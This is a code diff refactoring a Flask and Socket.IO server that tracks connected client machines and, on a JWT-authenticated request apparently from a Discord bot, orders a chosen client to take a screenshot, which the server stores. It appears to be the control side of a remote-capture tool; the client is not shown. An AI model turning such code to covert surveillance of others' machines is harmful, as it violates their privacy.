@@ -10,6 +10,7 @@ from flask_socketio import SocketIO
 
 from config.config import Config
 from config.extensions import db
+from models import Client, Screenshot
 
 app = Flask(__name__)
 app.config.from_object(Config)
@@ -17,19 +18,13 @@ db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
 
-# Models
-from models import Client, Screenshot
-
 socketio = SocketIO(app)
-clients = {}
 
 authorizations = {
     'bearer_auth': {
         'type': 'apiKey',
         'in': 'header',
-        'name': 'Authorization',
-        'description': "Type in the *'Value'* input box below: **'Bearer &lt;JWT&gt;'**, where &lt;JWT&gt; is the "
-                       "token."
+        'name': 'Authorization'
     }
 }
 
@@ -38,32 +33,30 @@ api = Api(app, version='1.0', title='Pedro API Documentation',
           authorizations=authorizations)
 
 auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
-command_ns = api.namespace('api/v1/command', description='Command operations', security='bearer_auth')
-clients_ns = api.namespace('api/v1/clients', description='Client operations', security='bearer_auth')
-screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations', security='bearer_auth')
+command_ns = api.namespace('api/v1/command', description='Command operations')
+clients_ns = api.namespace('api/v1/clients', description='Client operations')
+screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 
-auth_model = api.model('Auth', {
-    'secret_key': fields.String(required=True, description='Clé secrète')
+auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
+command_model = api.model('Command', {'command': fields.String(required=True, description='Commande à envoyer')})
+client_model = api.model('Client', {
+    'id': fields.Integer(required=True, description='ID du client'),
+    'ip': fields.String(required=True, description='Adresse IP du client'),
+    'os': fields.String(required=True, description='Système d\'exploitation du client'),
+    'os_version': fields.String(required=True, description='Version du système d\'exploitation du client'),
+    'hostname': fields.String(required=True, description='Nom d\'hôte du client'),
+    'status': fields.String(required=True, description='Statut du client'),
+    'date_created': fields.String(required=True, description='Date de création du client'),
+    'date_updated': fields.String(required=True, description='Date de mise à jour du client')
 })
-
-command_model = api.model('Command', {
-    'command': fields.String(required=True, description='Commande à envoyer')
+screenshots_model = api.model('Screenshots', {
+    'id': fields.Integer(required=True, description='ID de la capture d\'écran'),
+    'file_path': fields.String(required=True, description='Chemin du fichier de la capture d\'écran'),
+    'date_created': fields.String(required=True, description='Date de création de la capture d\'écran')
 })
 
 client_params = api.parser()
 client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')
-
-
-def emit_command_to_client(client_id, command):
-    client = Client.query.get(client_id)
-    if client and client.status == 'online':
-        socketio.emit('command', {'command': command}, room=client.sid)
-        return {'status': 'success',
-                'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
-    elif client and client.status == 'offline':
-        return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
-    else:
-        return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
 @auth_ns.route('/')
@@ -72,69 +65,67 @@ class Authenticate(Resource):
     def post(self):
         auth_data = request.json
         if auth_data and auth_data.get('secret_key') == app.config['JWT_SECRET_KEY']:
-            access_token = create_access_token(identity='bot_discord')
-            return {'access_token': access_token}
+            token = create_access_token(identity='bot_discord')
+            return {'access_token': f'Bearer {token}'}, 200
         else:
             return {"msg": "Mauvaise clé secrète"}, 401
 
 
 @command_ns.route('/<int:client_id>')
 class HandleCommand(Resource):
-    @api.doc(security='bearer_auth')
     @jwt_required()
     @command_ns.expect(command_model)
+    @api.doc(security='bearer_auth')
     def post(self, client_id):
         command_data = request.get_json()
         command = command_data.get('command')
-
         if command == 'screenshot':
-            return emit_command_to_client(client_id, command)
+            client = Client.query.get(client_id)
+            if client and client.status == 'online':
+                socketio.emit('command', {'command': command}, room=client.sid)
+                return {'status': 'success',
+                        'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
+            elif client and client.status == 'offline':
+                return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
+            else:
+                return {'status': 'error', 'message': 'Client non trouvé.'}, 404
         return {'status': 'error', 'message': 'Commande non reconnue.'}, 400
 
 
 @clients_ns.route('/')
 class GetClients(Resource):
-    @api.doc(parser=client_params, security='bearer_auth')
     @jwt_required()
+    @clients_ns.expect(client_params)
+    @clients_ns.marshal_with(client_model, as_list=True)
+    @api.doc(security='bearer_auth')
     def get(self):
         status_filter = request.args.get('status')
         if status_filter:
             clients = Client.query.filter_by(status=status_filter).all()
         else:
             clients = Client.query.all()
-
-        clients_info = [
-            {
-                'id': client.id,
-                'name': f'Client {client.id}',
-                'ip': client.ip,
-                'os': client.os,
-                'version': client.os_version,
-                'hostname': client.hostname,
-                'status': client.status,
-                'date_created': client.date_created.strftime('%d/%m/%Y à %H:%M:%S'),
-                'date_updated': client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
-            }
-            for client in clients]
-        return {'status': 'success', 'clients': clients_info}, 200
+        for client in clients:
+            client.date_created = client.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+            client.date_updated = client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
+        return clients, 200
 
 
 @screenshot_ns.route('/client/<int:client_id>')
 class GetScreenshotsByClientId(Resource):
-    @api.doc(security='bearer_auth')
     @jwt_required()
+    @api.doc(security='bearer_auth')
+    @screenshot_ns.marshal_with(screenshots_model, as_list=True)
     def get(self, client_id):
         screenshots = Screenshot.query.filter_by(client_id=client_id).all()
-        screenshots_info = [{
-            'id': screenshot.id,
-            'file_path': screenshot.file_path,
-            'date_created': screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
-        } for screenshot in screenshots]
-        return {'status': 'success', 'screenshots': screenshots_info}, 200
+        for screenshot in screenshots:
+            screenshot.date_created = screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return screenshots, 200
 
 
 @screenshot_ns.route('/image/<int:screenshot_id>')
 class GetScreenshotImage(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
     def get(self, screenshot_id):
         screenshot = Screenshot.query.get(screenshot_id)
         if screenshot and os.path.exists(screenshot.file_path):
@@ -156,7 +147,6 @@ def handle_connect():
         client = Client(ip=client_ip, status='online', sid=sid, date_created=datetime.now())
         db.session.add(client)
     db.session.commit()
-    print(f"Client {client_ip} en ligne.")
 
 
 @socketio.on('system_info')
@@ -168,8 +158,6 @@ def handle_system_info(data):
         client.os_version = data.get('os_version')
         client.hostname = data.get('hostname')
         db.session.commit()
-    else:
-        print("Client non trouvé.")
 
 
 @socketio.on('screenshot_response')
@@ -185,12 +173,9 @@ def handle_screenshot(data):
         screenshot_path = f"{screenshot_dir}/{file_name}"
         with open(screenshot_path, 'wb') as f:
             f.write(screenshot_bytes)
-
         new_screenshot = Screenshot(client_id=client.id, file_path=screenshot_path)
         db.session.add(new_screenshot)
         db.session.commit()
-    else:
-        print("Client non trouvé.")
 
 
 @socketio.on('disconnect')
@@ -201,7 +186,6 @@ def handle_disconnect():
         client.status = 'offline'
         client.date_updated = datetime.now()
         db.session.commit()
-    print(f"Client {client.ip} hors ligne.")
 
 
 if __name__ == '__main__':
